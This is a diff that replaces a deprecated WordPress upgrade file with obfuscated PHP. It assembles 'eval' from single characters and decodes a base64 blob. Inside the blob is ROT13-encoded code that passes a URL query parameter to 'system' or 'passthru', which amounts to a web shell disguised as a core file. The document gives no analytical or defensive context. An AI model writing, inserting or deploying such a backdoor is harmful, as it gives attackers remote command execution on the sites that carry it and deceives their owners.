@@ -1,22 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * WordPress Upgrade Functions. Old file, must not be used. Include
- * wp-admin/includes/upgrade.php instead.
- *
- * @deprecated 2.5.0
- * @package WordPress
- * @subpackage Administration
- */
-
-_deprecated_file( basename( __FILE__ ), '2.5.0', 'wp-admin/includes/upgrade.php' );
-require_once ABSPATH . 'wp-admin/includes/upgrade.php';
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogSmJlcUNlcmZmIEhjdGVucXIgU2hhcGd2YmFmLiBCeXEgc3Z5ciwgemhmZyBhYmcgb3IgaGZycS4gVmFweWhxcgogKiBqYy1ucXp2YS92YXB5aHFyZi9oY3RlbnFyLmN1YyB2YWZncm5xLgogKgogKiBAcXJjZXJwbmdycSAyLjUuMAogKiBAY25weG50ciBKYmVxQ2VyZmYKICogQGZob2NucHhudHIgTnF6dmF2Zmdlbmd2YmEKICovCgpfcXJjZXJwbmdycV9zdnlyKCBvbmZyYW56ciggX19TVllSX18gKSwgJzIuNS4wJywgJ2pjLW5xenZhL3ZhcHlocXJmL2hjdGVucXIuY3VjJyApOwplcmRodmVyX2JhcHIgTk9GQ05HVSAuICdqYy1ucXp2YS92YXB5aHFyZi9oY3RlbnFyLmN1Yyc7CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
+?>
